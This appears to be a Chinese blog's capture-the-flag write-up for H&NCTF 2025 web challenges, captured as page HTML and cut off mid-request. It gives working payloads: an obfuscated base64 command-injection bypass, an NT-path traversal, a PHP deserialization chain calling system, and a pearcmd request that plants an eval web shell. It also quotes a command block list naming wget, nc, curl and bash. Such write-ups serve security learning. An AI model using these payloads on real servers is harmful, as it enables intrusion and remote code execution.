<!DOCTYPE html>
<html lang="zh" dir="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>H&amp;NCTF-2025-Web-Writeup | Xrntkk&#39;s Blog</title>
<meta name="keywords" content="writeup, ctf, Web">
<meta name="description" content="Web
Really_Ez_Rce
源码
 1&lt;?php
 2header(&#39;Content-Type: text/html; charset=utf-8&#39;);
 3highlight_file(__FILE__);
 4error_reporting(0);
 5
 6if (isset($_REQUEST[&#39;Number&#39;])) {
 7    $inputNumber = $_REQUEST[&#39;Number&#39;];
 8    
 9    if (preg_match(&#39;/\d/&#39;, $inputNumber)) {
10        die(&#34;不行不行,不能这样&#34;);
11    }
12
13    if (intval($inputNumber)) {
14        echo &#34;OK,接下来你知道该怎么做吗&#34;;
15        
16        if (isset($_POST[&#39;cmd&#39;])) {
17            $cmd = $_POST[&#39;cmd&#39;];
18            
19            if (!preg_match(
20                &#39;/wget|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\\*|sort|zip|mod|sl|find|sed|cp|mv|ty|php|tee|txt|grep|base|fd|df|\\\\|more|cc|tac|less|head|\.|\{|\}|uniq|copy|%|file|xxd|date|\[|\]|flag|bash|env|!|\?|ls|\&#39;|\&#34;|id/i&#39;,
21                $cmd
22            )) {
23                echo &#34;你传的参数似乎挺正经的,放你过去吧&lt;br&gt;&#34;;
24                system($cmd);
25            } else {
26                echo &#34;nonono,hacker!!!&#34;;
27            }
28        }
29    }
30}
Payload:
POST: Number[]=1&amp;cmd=ec``ho Y2F0IC9mKg== | ba``se64 -d | bas``h
Watch
出题人写了一个基于 ntdll.dll 的 Windows NT 原生 API 调用实现的文件读取库">
<meta name="author" content="Xrntkk">
<link rel="canonical" href="http://localhost:1313/post/hnctf_2025/">

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  <meta name="referrer" content="no-referrer-when-downgrade">
<link crossorigin="anonymous" href="/assets/css/stylesheet.da3d1fce642585ca4a88e6246f264be963280e57889197b482bc138b96068178.css" integrity="sha256-2j0fzmQlhcpKiOYkbyZL6WMoDleIkZe0grwTi5YGgXg=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="zh" href="http://localhost:1313/post/hnctf_2025/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
<meta name="baidu-site-verification" content="codeva-snmPZ4WZk8" /><meta property="og:url" content="http://localhost:1313/post/hnctf_2025/">
  <meta property="og:site_name" content="Xrntkk&#39;s Blog">
  <meta property="og:title" content="H&NCTF-2025-Web-Writeup">
  <meta property="og:description" content="Web Really_Ez_Rce 源码
1&lt;?php 2header(&#39;Content-Type: text/html; charset=utf-8&#39;); 3highlight_file(__FILE__); 4error_reporting(0); 5 6if (isset($_REQUEST[&#39;Number&#39;])) { 7 $inputNumber = $_REQUEST[&#39;Number&#39;]; 8 9 if (preg_match(&#39;/\d/&#39;, $inputNumber)) { 10 die(&#34;不行不行,不能这样&#34;); 11 } 12 13 if (intval($inputNumber)) { 14 echo &#34;OK,接下来你知道该怎么做吗&#34;; 15 16 if (isset($_POST[&#39;cmd&#39;])) { 17 $cmd = $_POST[&#39;cmd&#39;]; 18 19 if (!preg_match( 20 &#39;/wget|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\\*|sort|zip|mod|sl|find|sed|cp|mv|ty|php|tee|txt|grep|base|fd|df|\\\\|more|cc|tac|less|head|\.|\{|\}|uniq|copy|%|file|xxd|date|\[|\]|flag|bash|env|!|\?|ls|\&#39;|\&#34;|id/i&#39;, 21 $cmd 22 )) { 23 echo &#34;你传的参数似乎挺正经的,放你过去吧&lt;br&gt;&#34;; 24 system($cmd); 25 } else { 26 echo &#34;nonono,hacker!!!&#34;; 27 } 28 } 29 } 30} Payload:
POST: Number[]=1&amp;cmd=ec``ho Y2F0IC9mKg== | ba``se64 -d | bas``h Watch 出题人写了一个基于 ntdll.dll 的 Windows NT 原生 API 调用实现的文件读取库">
  <meta property="og:locale" content="zh">
  <meta property="og:type" content="article">
    <meta property="article:section" content="post">
    <meta property="article:published_time" content="2025-06-08T22:29:00+08:00">
    <meta property="article:modified_time" content="2025-06-08T22:29:00+08:00">
    <meta property="article:tag" content="Writeup">
    <meta property="article:tag" content="Ctf">
    <meta property="article:tag" content="Web">
      <meta property="og:image" content="https://i.postimg.cc/7hwBy7VS/calcr.png">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://i.postimg.cc/7hwBy7VS/calcr.png">
<meta name="twitter:title" content="H&amp;NCTF-2025-Web-Writeup">
<meta name="twitter:description" content="Web
Really_Ez_Rce
源码
 1&lt;?php
 2header(&#39;Content-Type: text/html; charset=utf-8&#39;);
 3highlight_file(__FILE__);
 4error_reporting(0);
 5
 6if (isset($_REQUEST[&#39;Number&#39;])) {
 7    $inputNumber = $_REQUEST[&#39;Number&#39;];
 8    
 9    if (preg_match(&#39;/\d/&#39;, $inputNumber)) {
10        die(&#34;不行不行,不能这样&#34;);
11    }
12
13    if (intval($inputNumber)) {
14        echo &#34;OK,接下来你知道该怎么做吗&#34;;
15        
16        if (isset($_POST[&#39;cmd&#39;])) {
17            $cmd = $_POST[&#39;cmd&#39;];
18            
19            if (!preg_match(
20                &#39;/wget|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\\*|sort|zip|mod|sl|find|sed|cp|mv|ty|php|tee|txt|grep|base|fd|df|\\\\|more|cc|tac|less|head|\.|\{|\}|uniq|copy|%|file|xxd|date|\[|\]|flag|bash|env|!|\?|ls|\&#39;|\&#34;|id/i&#39;,
21                $cmd
22            )) {
23                echo &#34;你传的参数似乎挺正经的,放你过去吧&lt;br&gt;&#34;;
24                system($cmd);
25            } else {
26                echo &#34;nonono,hacker!!!&#34;;
27            }
28        }
29    }
30}
Payload:
POST: Number[]=1&amp;cmd=ec``ho Y2F0IC9mKg== | ba``se64 -d | bas``h
Watch
出题人写了一个基于 ntdll.dll 的 Windows NT 原生 API 调用实现的文件读取库">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "http://localhost:1313/post/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "H\u0026NCTF-2025-Web-Writeup",
      "item": "http://localhost:1313/post/hnctf_2025/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "H\u0026NCTF-2025-Web-Writeup",
  "name": "H\u0026NCTF-2025-Web-Writeup",
  "description": "Web Really_Ez_Rce 源码\n1\u0026lt;?php 2header(\u0026#39;Content-Type: text/html; charset=utf-8\u0026#39;); 3highlight_file(__FILE__); 4error_reporting(0); 5 6if (isset($_REQUEST[\u0026#39;Number\u0026#39;])) { 7 $inputNumber = $_REQUEST[\u0026#39;Number\u0026#39;]; 8 9 if (preg_match(\u0026#39;/\\d/\u0026#39;, $inputNumber)) { 10 die(\u0026#34;不行不行,不能这样\u0026#34;); 11 } 12 13 if (intval($inputNumber)) { 14 echo \u0026#34;OK,接下来你知道该怎么做吗\u0026#34;; 15 16 if (isset($_POST[\u0026#39;cmd\u0026#39;])) { 17 $cmd = $_POST[\u0026#39;cmd\u0026#39;]; 18 19 if (!preg_match( 20 \u0026#39;/wget|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\\\\*|sort|zip|mod|sl|find|sed|cp|mv|ty|php|tee|txt|grep|base|fd|df|\\\\\\\\|more|cc|tac|less|head|\\.|\\{|\\}|uniq|copy|%|file|xxd|date|\\[|\\]|flag|bash|env|!|\\?|ls|\\\u0026#39;|\\\u0026#34;|id/i\u0026#39;, 21 $cmd 22 )) { 23 echo \u0026#34;你传的参数似乎挺正经的,放你过去吧\u0026lt;br\u0026gt;\u0026#34;; 24 system($cmd); 25 } else { 26 echo \u0026#34;nonono,hacker!!!\u0026#34;; 27 } 28 } 29 } 30} Payload:\nPOST: Number[]=1\u0026amp;cmd=ec``ho Y2F0IC9mKg== | ba``se64 -d | bas``h Watch 出题人写了一个基于 ntdll.dll 的 Windows NT 原生 API 调用实现的文件读取库\n",
  "keywords": [
    "writeup", "ctf", "Web"
  ],
  "articleBody": "Web Really_Ez_Rce 源码\n1\u003c?php 2header('Content-Type: text/html; charset=utf-8'); 3highlight_file(__FILE__); 4error_reporting(0); 5 6if (isset($_REQUEST['Number'])) { 7 $inputNumber = $_REQUEST['Number']; 8 9 if (preg_match('/\\d/', $inputNumber)) { 10 die(\"不行不行,不能这样\"); 11 } 12 13 if (intval($inputNumber)) { 14 echo \"OK,接下来你知道该怎么做吗\"; 15 16 if (isset($_POST['cmd'])) { 17 $cmd = $_POST['cmd']; 18 19 if (!preg_match( 20 '/wget|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\\\\*|sort|zip|mod|sl|find|sed|cp|mv|ty|php|tee|txt|grep|base|fd|df|\\\\\\\\|more|cc|tac|less|head|\\.|\\{|\\}|uniq|copy|%|file|xxd|date|\\[|\\]|flag|bash|env|!|\\?|ls|\\'|\\\"|id/i', 21 $cmd 22 )) { 23 echo \"你传的参数似乎挺正经的,放你过去吧\n\"; 24 system($cmd); 25 } else { 26 echo \"nonono,hacker!!!\"; 27 } 28 } 29 } 30} Payload:\nPOST: Number[]=1\u0026cmd=ec``ho Y2F0IC9mKg== | ba``se64 -d | bas``h Watch 出题人写了一个基于 ntdll.dll 的 Windows NT 原生 API 调用实现的文件读取库\n1package utils 2 3import ( 4\t\"fmt\" 5\t\"syscall\" 6\t\"unsafe\" 7) 8 9const ( 10\tSTATUS_SUCCESS = 0x00000000 11\tSTATUS_NO_MORE_FILES = 0x80000006 12\tSTATUS_BUFFER_OVERFLOW = 0x80000005 13\tFILE_READ_DATA = 0x0001 14\tFILE_LIST_DIRECTORY = 0x0001 15\tFILE_READ_ATTRIBUTES = 0x0080 16\tSYNCHRONIZE = 0x00100000 17\tFILE_SHARE_READ = 0x00000001 18\tFILE_SHARE_WRITE = 0x00000002 19\tFILE_SHARE_DELETE = 0x00000004 20\tFILE_ATTRIBUTE_DIRECTORY = 0x00000010 21\tFILE_DIRECTORY_FILE = 0x00000001 22\tFILE_SYNCHRONOUS_IO_NONALERT = 0x00000020 23\tOBJ_CASE_INSENSITIVE = 0x00000040 24\tFileDirectoryInformation = 1 25\tFileBasicInformation = 4 26) 27 28type UNICODE_STRING struct { 29\tLength uint16 30\tMaximumLength uint16 31\tBuffer *uint16 32} 33 34type OBJECT_ATTRIBUTES struct { 35\tLength uint32 36\tRootDirectory syscall.Handle 37\tObjectName *UNICODE_STRING 38\tAttributes uint32 39\tSecurityDescriptor uintptr 40\tSecurityQualityOfService uintptr 41} 42 43type IO_STATUS_BLOCK struct { 44\tStatus uintptr 45\tInformation uintptr 46} 47 48type FILE_DIRECTORY_INFORMATION struct { 49\tNextEntryOffset uint32 50\tFileIndex uint32 51\tCreationTime int64 52\tLastAccessTime int64 53\tLastWriteTime int64 54\tChangeTime int64 55\tEndOfFile int64 56\tAllocationSize int64 57\tFileAttributes uint32 58\tFileNameLength uint32 59} 60 61type FILE_BASIC_INFORMATION struct { 62\tCreationTime int64 63\tLastAccessTime int64 64\tLastWriteTime int64 65\tChangeTime int64 66\tFileAttributes uint32 67} 68 69var ( 70\tdll = syscall.NewLazyDLL(\"ntdll.dll\") 71\tprocOpenFile = dll.NewProc(\"NtOpenFile\") 72\tprocClose = dll.NewProc(\"NtClose\") 73\tprocQueryDirectoryFile = dll.NewProc(\"NtQueryDirectoryFile\") 74\tprocReadFile = dll.NewProc(\"NtReadFile\") 75\tprocQueryInformationFile = dll.NewProc(\"NtQueryInformationFile\") 76\tprocRtlInitUnicodeString = dll.NewProc(\"RtlInitUnicodeString\") 77) 78 79func rtlInitUnicodeString(destinationString *UNICODE_STRING, sourceString *uint16) { 80\tprocRtlInitUnicodeString.Call( 81\tuintptr(unsafe.Pointer(destinationString)), 82\tuintptr(unsafe.Pointer(sourceString)), 83\t) 84} 85 86func openFile(fileHandle *syscall.Handle, desiredAccess uint32, objectAttributes *OBJECT_ATTRIBUTES, ioStatusBlock *IO_STATUS_BLOCK, shareAccess uint32, openOptions uint32) uint32 { 87\tret, _, _ := procOpenFile.Call( 88\tuintptr(unsafe.Pointer(fileHandle)), 89\tuintptr(desiredAccess), 90\tuintptr(unsafe.Pointer(objectAttributes)), 91\tuintptr(unsafe.Pointer(ioStatusBlock)), 92\tuintptr(shareAccess), 93\tuintptr(openOptions), 94\t) 95\treturn uint32(ret) 96} 97 98func HandleClose(handle syscall.Handle) uint32 { 99\tret, _, _ := procClose.Call(uintptr(handle)) 100\treturn uint32(ret) 101} 102 103func queryDirectoryFile(fileHandle syscall.Handle, event syscall.Handle, apcRoutine uintptr, apcContext uintptr, ioStatusBlock *IO_STATUS_BLOCK, fileInformation uintptr, length uint32, fileInformationClass uint32, returnSingleEntry bool, fileName *UNICODE_STRING, restartScan bool) uint32 { 104\tvar singleEntry uintptr = 0 105\tif returnSingleEntry { 106\tsingleEntry = 1 107\t} 108\tvar restart uintptr = 0 109\tif restartScan { 110\trestart = 1 111\t} 112 113\tret, _, _ := procQueryDirectoryFile.Call( 114\tuintptr(fileHandle), 115\tuintptr(event), 116\tapcRoutine, 117\tapcContext, 118\tuintptr(unsafe.Pointer(ioStatusBlock)), 119\tfileInformation, 120\tuintptr(length), 121\tuintptr(fileInformationClass), 122\tsingleEntry, 123\tuintptr(unsafe.Pointer(fileName)), 124\trestart, 125\t) 126\treturn uint32(ret) 127} 128 129func readFile(fileHandle syscall.Handle, event syscall.Handle, apcRoutine uintptr, apcContext uintptr, ioStatusBlock *IO_STATUS_BLOCK, buffer uintptr, length uint32, byteOffset *int64, key uintptr) uint32 { 130\tret, _, _ := procReadFile.Call( 131\tuintptr(fileHandle), 132\tuintptr(event), 133\tapcRoutine, 134\tapcContext, 135\tuintptr(unsafe.Pointer(ioStatusBlock)), 136\tbuffer, 137\tuintptr(length), 138\tuintptr(unsafe.Pointer(byteOffset)), 139\tkey, 140\t) 141\treturn uint32(ret) 142} 143 144func queryInformationFile(fileHandle syscall.Handle, ioStatusBlock *IO_STATUS_BLOCK, fileInformation uintptr, length uint32, fileInformationClass uint32) uint32 { 145\tret, _, _ := procQueryInformationFile.Call( 146\tuintptr(fileHandle), 147\tuintptr(unsafe.Pointer(ioStatusBlock)), 148\tfileInformation, 149\tuintptr(length), 150\tuintptr(fileInformationClass), 151\t) 152\treturn uint32(ret) 153} 154 155func stringToUTF16Ptr(s string) *uint16 { 156\tutf16, err := syscall.UTF16FromString(s) 157\tif err != nil { 158\treturn nil 159\t} 160\treturn \u0026utf16[0] 161} 162 163func utf16PtrToString(ptr *uint16, length uint32) string { 164\tif ptr == nil || length == 0 { 165\treturn \"\" 166\t} 167 168\tslice := (*[256]uint16)(unsafe.Pointer(ptr))[:length/2] 169\treturn syscall.UTF16ToString(slice) 170} 171 172func OpenPath(path string) (syscall.Handle, bool, error) { 173\tvar objectNameDir UNICODE_STRING 174\tvar handle syscall.Handle 175\tvar iosb IO_STATUS_BLOCK 176\tpathDirPtr := stringToUTF16Ptr(path + `\\`) 177\trtlInitUnicodeString(\u0026objectNameDir, pathDirPtr) 178 179\tobjAttrDir := OBJECT_ATTRIBUTES{ 180\tLength: uint32(unsafe.Sizeof(OBJECT_ATTRIBUTES{})), 181\tObjectName: \u0026objectNameDir, 182\tAttributes: OBJ_CASE_INSENSITIVE, 183\t} 184 185\tstatus := openFile( 186\t\u0026handle, 187\tFILE_LIST_DIRECTORY|FILE_READ_ATTRIBUTES|SYNCHRONIZE, 188\t\u0026objAttrDir, 189\t\u0026iosb, 190\tFILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE, 191\tFILE_DIRECTORY_FILE|FILE_SYNCHRONOUS_IO_NONALERT, 192\t) 193 194\tif status == STATUS_SUCCESS { 195\treturn handle, true, nil 196\t} 197 198\tvar objectNameFile UNICODE_STRING 199\tpathFilePtr := stringToUTF16Ptr(path) 200\trtlInitUnicodeString(\u0026objectNameFile, pathFilePtr) 201 202\tobjAttrFile := OBJECT_ATTRIBUTES{ 203\tLength: uint32(unsafe.Sizeof(OBJECT_ATTRIBUTES{})), 204\tObjectName: \u0026objectNameFile, 205\tAttributes: OBJ_CASE_INSENSITIVE, 206\t} 207 208\tstatus = openFile( 209\t\u0026handle, 210\tFILE_READ_DATA|FILE_READ_ATTRIBUTES|SYNCHRONIZE, 211\t\u0026objAttrFile, 212\t\u0026iosb, 213\tFILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE, 214\tFILE_SYNCHRONOUS_IO_NONALERT, 215\t) 216 217\tif status == STATUS_SUCCESS { 218\treturn handle, false, nil 219\t} 220 221\treturn 0, false, fmt.Errorf(\"cant open %s\", path) 222} 223 224func ListDirectory(handle syscall.Handle) (string, error) { 225\tconst bufferSize = 65536 226\tbuffer := make([]byte, bufferSize) 227 228\tvar iosb IO_STATUS_BLOCK 229\tvar listString string 230\tlistString = \"Directory\\n==================\\n\" 231 232\tfor { 233\tstatus := queryDirectoryFile( 234\thandle, 235\t0, 236\t0, 237\t0, 238\t\u0026iosb, 239\tuintptr(unsafe.Pointer(\u0026buffer[0])), 240\tbufferSize, 241\tFileDirectoryInformation, 242\tfalse, 243\tnil, 244\tfalse, 245\t) 246 247\tif status == STATUS_NO_MORE_FILES { 248\tbreak 249\t} 250 251\tif status != STATUS_SUCCESS \u0026\u0026 status != STATUS_BUFFER_OVERFLOW { 252\treturn \"\", fmt.Errorf(\"query directory failed\") 253\t} 254 255\toffset := uint32(0) 256\tfor offset \u003c uint32(iosb.Information) { 257\tdirInfo := (*FILE_DIRECTORY_INFORMATION)(unsafe.Pointer(\u0026buffer[offset])) 258 259\tfileNamePtr := (*uint16)(unsafe.Pointer(uintptr(unsafe.Pointer(dirInfo)) + unsafe.Sizeof(*dirInfo))) 260\tfileName := utf16PtrToString(fileNamePtr, dirInfo.FileNameLength) 261 262\tfileType := \"file\" 263\tif dirInfo.FileAttributes\u0026FILE_ATTRIBUTE_DIRECTORY != 0 { 264\tfileType = \"dir\" 265\t} 266 267\tlistString += fmt.Sprintf(\"[%s] %s (size: %d bytes)\\n\", fileType, fileName, dirInfo.EndOfFile) 268 269\tif dirInfo.NextEntryOffset == 0 { 270\tbreak 271\t} 272\toffset += dirInfo.NextEntryOffset 273\t} 274 275\tif status != STATUS_BUFFER_OVERFLOW { 276\tbreak 277\t} 278\t} 279\treturn listString, nil 280} 281 282func ReadFile(handle syscall.Handle) (string, error) { 283\tvar basicInfo FILE_BASIC_INFORMATION 284\tvar iosb IO_STATUS_BLOCK 285 286\tstatus := queryInformationFile( 287\thandle, 288\t\u0026iosb, 289\tuintptr(unsafe.Pointer(\u0026basicInfo)), 290\tuint32(unsafe.Sizeof(basicInfo)), 291\tFileBasicInformation, 292\t) 293 294\tif status != STATUS_SUCCESS { 295\treturn \"\", fmt.Errorf(\"get file information failed\") 296\t} 297 298\tvar fileString string 299\tfileString = \"File\\n==================\\n\" 300 301\tconst maxReadSize = 1024 * 1024 302\tbuffer := make([]byte, maxReadSize) 303\tvar offset int64 = 0 304 305\tstatus = readFile( 306\thandle, 307\t0, 308\t0, 309\t0, 310\t\u0026iosb, 311\tuintptr(unsafe.Pointer(\u0026buffer[0])), 312\tmaxReadSize, 313\t\u0026offset, 314\t0, 315\t) 316 317\tif status == STATUS_SUCCESS { 318\tbytesRead := iosb.Information 319\tif bytesRead \u003e 0 { 320\tcontent := string(buffer[:bytesRead]) 321\tfileString += fmt.Sprintf(\"%s\\n\", content) 322\tif bytesRead == maxReadSize { 323\tfileString += fmt.Sprintf(\"\\n[Tip: only part of the file is read, file size may be larger than 1MB]\\n\") 324\t} 325\t} else { 326\tfileString += fmt.Sprintf(\"[file is empty]\") 327\t} 328\t} else { 329\treturn \"\", fmt.Errorf(\"read file failed\") 330\t} 331 332\treturn fileString, nil 333} 我们看handle.go\n在这里会将我们传入的地址通过filepath.Join与\\SystemRoot\\进行拼接后传入OpenPath\n想要使用NtOpenFile读文件我们需要使用符合格式的nt路径，而不是我们平常使用的win32路径。\n如题目中的\\SystemRoot\\就是指向C:\\Windows\\的符号链接\n可以参考：https://kiwids.me/posts/NT-Filesystem-Internals-Study-Notes/#nt-namespace-native-object-paths\n所以我们如果想要读D盘的话，就有两种方法，第一种就是通过盘符去读\n\\??\\D:\\ 第二种是通过卷的设备路径去读\n\\Device\\HarddiskVolume3\\ //HarddiskVolume2是C盘 回到这道题，由于会在传入的路径前面进行拼接，所以我们要在传入的path前面加入..\nPayload ?path=..\\??\\D:\\key.txt 或者\n?path=..\\Device\\HarddiskVolume3\\key.txt 题外话 事实上第一种方法是有局限性的，我们可以看到这道题的go的版本为1.20，filepath.Join不会对??\\D:\\进行过滤\n而在最新的版本中会将??\\转换为\\.??\\，导致方法一失效，如图：\n这是GO1.23.6版的filepath.Join\n这是GO1.20版本的filepath.Join\n而第二种方法则不受版本限制，在高版本中依旧适用\nez_php 题目\n1\u003c?php 2error_reporting(0); 3class GOGOGO{ 4 public $dengchao; 5 function __destruct(){ 6 echo \"Go Go Go~ 出发喽！\" . $this-\u003edengchao; 7 } 8} 9class DouBao{ 10 public $dao; 11 public $Dagongren; 12 public $Bagongren; 13 function __toString(){ 14 if( ($this-\u003eDagongren != $this-\u003eBagongren) \u0026\u0026 (md5($this-\u003eDagongren) === md5($this-\u003eBagongren)) \u0026\u0026 (sha1($this-\u003eDagongren)=== sha1($this-\u003eBagongren)) ){ 15 call_user_func_array($this-\u003edao, ['诗人我吃！']); 16 } 17 } 18} 19class HeiCaFei{ 20 public $HongCaFei; 21 function __call($name, $arguments){ 22 call_user_func_array($this-\u003eHongCaFei, [0 =\u003e $name]); 23 } 24} 25 26if (isset($_POST['data'])) { 27 $temp = unserialize($_POST['data']); 28 throw new Exception('What do you want to do?'); 29} else { 30 highlight_file(__FILE__); 31} 32?\u003e POC\n1\u003c?php 2 3class GOGOGO { 4 public $dengchao; 5} 6 7class DouBao { 8 public $dao; 9 public $Dagongren; 10 public $Bagongren; 11} 12 13class HeiCaFei { 14 public $HongCaFei; 15} 16 17$exp = new GOGOGO(); 18$exp -\u003e dengchao = new Doubao(); 19$hcf = new HeiCaFei(); 20$hcf-\u003eHongCaFei = \"system\"; 21$exp -\u003e dengchao -\u003e dao = array($hcf,\"cat /ofl1111111111ove4g\"); 22$a=new Error(\"xrntkk\",1);$b=new Error(\"xrntkk\",2); 23$exp -\u003e dengchao -\u003e Dagongren = $a; 24$exp -\u003e dengchao -\u003e Bagongren = $b; 25 26 27echo urlencode(serialize($exp)); 得到\nO%3A6%3A%22GOGOGO%22%3A1%3A%7Bs%3A8%3A%22dengchao%22%3BO%3A6%3A%22DouBao%22%3A3%3A%7Bs%3A3%3A%22dao%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A8%3A%22HeiCaFei%22%3A1%3A%7Bs%3A9%3A%22HongCaFei%22%3Bs%3A6%3A%22system%22%3B%7Di%3A1%3Bs%3A23%3A%22cat+%2Fofl1111111111ove4g%22%3B%7Ds%3A9%3A%22Dagongren%22%3BO%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A6%3A%22xrntkk%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A1%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A42%3A%22D%3A%5Cphpstudy_pro%5CWWW%5CtempCodeRunnerFile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A22%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7Ds%3A9%3A%22Bagongren%22%3BO%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A6%3A%22xrntkk%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A2%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A42%3A%22D%3A%5Cphpstudy_pro%5CWWW%5CtempCodeRunnerFile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A22%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D%7D%7D 还需要绕过\nthrow new Exception('What do you want to do?'); 在最后一个括号前面加上;1即可\n最终payload\nO%3A6%3A%22GOGOGO%22%3A1%3A%7Bs%3A8%3A%22dengchao%22%3BO%3A6%3A%22DouBao%22%3A3%3A%7Bs%3A3%3A%22dao%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A8%3A%22HeiCaFei%22%3A1%3A%7Bs%3A9%3A%22HongCaFei%22%3Bs%3A6%3A%22system%22%3B%7Di%3A1%3Bs%3A23%3A%22cat+%2Fofl1111111111ove4g%22%3B%7Ds%3A9%3A%22Dagongren%22%3BO%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A6%3A%22xrntkk%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A1%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A42%3A%22D%3A%5Cphpstudy_pro%5CWWW%5CtempCodeRunnerFile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A22%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7Ds%3A9%3A%22Bagongren%22%3BO%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A6%3A%22xrntkk%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A2%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A42%3A%22D%3A%5Cphpstudy_pro%5CWWW%5CtempCodeRunnerFile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A22%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D%7D;1%7D DeceptiFlag 先对个脑洞\n1POST /?qaq=xiyangyang HTTP/1.1 2Host: 27.25.151.198:38605 3Upgrade-Insecure-Requests: 1 4Cache-Control: max-age=0 5Accept-Encoding: gzip, deflate 6Referer: http://27.25.151.198:38605/ 7Cookie: PHPSESSID=d75f67cbc118fd9eb75b84c0c91cd7fd; pahint=L3Zhci9mbGFnL2ZsYWcudHh0 8Origin: http://27.25.151.198:38605 9Accept-Language: zh-CN,zh;q=0.9 10Content-Type: application/x-www-form-urlencoded 11User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36 12Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 13Content-Length: 28 14 15qaq_visible=xiyangyang\u0026Lang=huitailang 接着看到可以文件包含，但是会在后面拼接上.php\n伪协议直接读\n1POST /tips.php?file=php://filter/resource=/var/flag/flag.txt HTTP/1.1 2Host: 27.25.151.198:38605 3Upgrade-Insecure-Requests: 1 4Cache-Control: max-age=0 5Accept-Encoding: gzip, deflate 6Referer: http://27.25.151.198:38605/ 7Cookie: PHPSESSID=d75f67cbc118fd9eb75b84c0c91cd7fd; pahint=L3Zhci9mbGFnL2ZsYWcudHh0 8Origin: http://27.25.151.198:38605 9Accept-Language: zh-CN,zh;q=0.9 10Content-Type: application/x-www-form-urlencoded 11User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36 12Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 13Content-Length: 28 14 15qaq_visible=xiyangyang\u0026Lang=huitailang 这题也可以打pearcmd，狠狠上马\n1POST /tips.php?+config-create+/\u0026file=file:///usr/local/lib/php/pearcmd\u0026/\u003c?=eval($_POST[1])?\u003e+1.php HTTP/1.1 2Host: 27.25.151.198:49096 3Content-Type: application/x-www-form-urlencoded 4Accept-Encoding: gzip, deflate 5Cookie: 